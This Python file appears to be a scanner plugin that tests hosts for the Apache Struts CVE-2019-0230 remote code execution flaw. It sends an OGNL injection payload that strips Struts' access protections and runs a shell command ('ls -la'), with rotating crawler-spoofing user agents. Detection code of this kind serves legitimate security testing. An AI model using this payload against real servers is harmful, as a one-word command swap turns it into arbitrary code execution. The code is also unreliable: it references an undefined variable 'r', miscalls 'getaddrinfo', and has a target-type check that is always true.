#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Aman Gupta github.com/aman566
# https://www.tenable.com/blog/cve-2019-0230-apache-struts-potential-remote-code-execution-vulnerability

import socket
import socks
import time
import json
import threading
import string
import random
import sys
import struct
import re
import os
from OpenSSL import crypto
import ssl
from core.alert import *
from core.targets import target_type
import logging
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.log import __log_into_file
import requests


def extra_requirements_dict():
    return {"apache_struts_cve_2019_0230_vuln_ports": [80, 443, 8080]}


def conn(targ, port, timeout_sec, socks_proxy):
    try:
        if socks_proxy is not None:
            socks_version = (
                socks.SOCKS5 if socks_proxy.startswith("socks5://") else socks.SOCKS4
            )
            socks_proxy = socks_proxy.rsplit("://")[1]
            if "@" in socks_proxy:
                socks_username = socks_proxy.rsplit(":")[0]
                socks_password = socks_proxy.rsplit(":")[1].rsplit("@")[0]
                socks.set_default_proxy(
                    socks_version,
                    str(socks_proxy.rsplit("@")[1].rsplit(":")[0]),
                    int(socks_proxy.rsplit(":")[-1]),
                    username=socks_username,
                    password=socks_password,
                )
                socket.socket = socks.socksocket
                socket.getaddrinfo = getaddrinfo
            else:
                socks.set_default_proxy(
                    socks_version,
                    str(socks_proxy.rsplit(":")[0]),
                    int(socks_proxy.rsplit(":")[1]),
                )
                socket.socket = socks.socksocket
                socket.getaddrinfo = getaddrinfo()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        s.settimeout(timeout_sec)
        s.connect((targ, port))
        return s
    except Exception:
        return None


def apache_struts_vuln(
    target,
    port,
    timeout_sec,
    log_in_file,
    language,
    time_sleep,
    thread_tmp_filename,
    socks_proxy,
    scan_id,
    scan_cmd,
):
    try:
        s = conn(target_to_host(target), port, timeout_sec, socks_proxy)
        if not s:
            return False
        else:
            if (
                target_type(target) != "HTTP"
                and port in extra_requirements_dict()["apache_struts_cve_2019_0230_vuln_ports"]
            ):
                target = "https://" + target
            user_agent = [
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
                "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04"
                " Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
                "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
                "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
                "Debian APT-HTTP/1.3 (0.8.10.3)",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
                "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
                "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; "
                "http://help.yahoo.com/help/us/shop/merchant/)",
                "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "msnbot/1.1 (+http://search.msn.com/msnbot.htm)",
            ]
            headers = {
                "User-Agent": random.choice(user_agent),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.7,ru;q=0.3",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            id = "%{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('ls -la').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()}"
            params = {"id": id}
            try:
                response = requests.post(target, headers=headers, verify=False, timeout=timeout_sec, data=params)
                if r.status_code == 200 and "total" in response.text.lower():
                    return True
            except Exception:
                return False

    except Exception:
        return False


def __apache_struts_vuln(
    target,
    port,
    timeout_sec,
    log_in_file,
    language,
    verbose_level,
    time_sleep,
    thread_tmp_filename,
    socks_proxy,
    scan_id,
    scan_cmd,
):
    if apache_struts_vuln(
        target,
        port,
        timeout_sec,
        log_in_file,
        language,
        time_sleep,
        thread_tmp_filename,
        socks_proxy,
        scan_id,
        scan_cmd,
    ):
        info(
            messages(language, "target_vulnerable").format(
                target, port, "Apache Struts RCE CVE-2019-0230 Vulnerability"
            )
        )
        __log_into_file(thread_tmp_filename, "w", "0", language)
        data = json.dumps(
            {
                "HOST": target,
                "USERNAME": "",
                "PASSWORD": "",
                "PORT": port,
                "TYPE": "apache_struts_cve_2019_0230_vuln",
                "DESCRIPTION": messages(language, "vulnerable").format(
                    "apache_struts_cve_2019_0230_vuln"
                ),
                "TIME": now(),
                "CATEGORY": "vuln",
                "SCAN_ID": scan_id,
                "SCAN_CMD": scan_cmd,
            }
        )
        __log_into_file(log_in_file, "a", data, language)
        return True
    else:
        return False


def start(
    target,
    users,
    passwds,
    ports,
    timeout_sec,
    thread_number,
    num,
    total,
    log_in_file,
    time_sleep,
    language,
    verbose_level,
    socks_proxy,
    retries,
    methods_args,
    scan_id,
    scan_cmd,
):  # Main function
    if (
        target_type(target) != "SINGLE_IPv4"
        or target_type(target) != "DOMAIN"
        or target_type(target) != "HTTP"
    ):
        # requirements check
        new_extra_requirements = extra_requirements_dict()
        if methods_args is not None:
            for extra_requirement in extra_requirements_dict():
                if extra_requirement in methods_args:
                    new_extra_requirements[extra_requirement] = methods_args[
                        extra_requirement
                    ]
        extra_requirements = new_extra_requirements
        if ports is None:
            ports = extra_requirements["apache_struts_cve_2019_0230_vuln_ports"]
        threads = []
        total_req = len(ports)
        thread_tmp_filename = "{}/tmp/thread_tmp_".format(load_file_path()) + "".join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20)
        )
        __log_into_file(thread_tmp_filename, "w", "1", language)
        trying = 0
        keyboard_interrupt_flag = False

        for port in ports:
            port = int(port)
            t = threading.Thread(
                target=__apache_struts_vuln,
                args=(
                    target,
                    int(port),
                    timeout_sec,
                    log_in_file,
                    language,
                    verbose_level,
                    time_sleep,
                    thread_tmp_filename,
                    socks_proxy,
                    scan_id,
                    scan_cmd,
                ),
            )
            threads.append(t)
            t.start()
            trying += 1
            if verbose_level > 3:
                info(
                    messages(language, "trying_message").format(
                        trying,
                        total_req,
                        num,
                        total,
                        target,
                        port,
                        "apache_struts_cve_2019_0230_vuln",
                    )
                )
            while 1:
                try:
                    if threading.activeCount() >= thread_number:
                        time.sleep(0.01)
                    else:
                        break
                except KeyboardInterrupt:
                    keyboard_interrupt_flag = True
                    break
            if keyboard_interrupt_flag:
                break
        # wait for threads
        kill_switch = 0
        while 1:
            time.sleep(0.1)
            kill_switch += 1
            try:
                if threading.activeCount() == 1:
                    break
            except KeyboardInterrupt:
                break
        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
        if thread_write == 1 and verbose_level != 0:
            info(
                messages(language, "no_vulnerability_found").format(
                    "apache_struts_cve_2019_0230_vuln not found"
                )
            )
            data = json.dumps(
                {
                    "HOST": target,
                    "USERNAME": "",
                    "PASSWORD": "",
                    "PORT": "",
                    "TYPE": "apache_struts_cve_2019_0230_vuln",
                    "DESCRIPTION": messages(language, "no_vulnerability_found").format(
                        "apache_struts_cve_2019_0230_vuln not found"
                    ),
                    "TIME": now(),
                    "CATEGORY": "scan",
                    "SCAN_ID": scan_id,
                    "SCAN_CMD": scan_cmd,
                }
            )
            __log_into_file(log_in_file, "a", data, language)
        os.remove(thread_tmp_filename)

    else:
        warn(
            messages(language, "input_target_error").format(
                "apache_struts_cve_2019_0230_vuln", target
            )
        )
